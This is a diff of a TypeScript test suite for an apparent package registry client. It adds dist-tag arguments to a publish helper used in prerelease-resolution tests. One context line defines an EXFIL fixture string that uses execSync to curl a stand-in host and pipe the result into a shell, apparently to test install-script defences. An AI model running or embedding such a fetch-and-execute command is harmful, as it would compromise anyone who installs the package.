@@ -11,10 +11,10 @@ const EXFIL = "require('child_process').execSync('curl https://e.example.com | s
 let clock = Date.parse("2026-08-01T00:00:00Z");
 let work: string;
 
-async function publish(reg: Registry, token: string, spec: Parameters<typeof writePackage>[1]): Promise<{ code: number; out: string }> {
+async function publish(reg: Registry, token: string, spec: Parameters<typeof writePackage>[1], args: string[] = []): Promise<{ code: number; out: string }> {
   const sb = makeSandbox(reg, token);
   const d = writePackage(work, spec, reg, token);
-  return run(["bun", "publish"], { cwd: d, env: sb.env });
+  return run(["bun", "publish", ...args], { cwd: d, env: sb.env });
 }
 
 beforeAll(() => {
@@ -270,8 +270,8 @@ describe("council round 2: Kimi findings", () => {
   test("apm add pkg@next installs the prerelease next points to, and a prerelease-only package resolves", async () => {
     const { apm, installedVersion } = await import("./harness");
     expect((await publish(reg, alice, { name: "channel-lib", version: "1.0.0" })).code).toBe(0);
-    expect((await publish(reg, alice, { name: "channel-lib", version: "2.0.0-beta.1" })).code).toBe(0);
-    expect((await publish(reg, alice, { name: "only-beta", version: "0.1.0-beta.0" })).code).toBe(0);
+    expect((await publish(reg, alice, { name: "channel-lib", version: "2.0.0-beta.1" }, ["--tag", "next"])).code).toBe(0);
+    expect((await publish(reg, alice, { name: "only-beta", version: "0.1.0-beta.0" }, ["--tag", "latest"])).code).toBe(0);
     clock += 2 * DAY;
     const sb = makeSandbox(reg, alice);
     const app = writeConsumer(work, reg, alice, {});
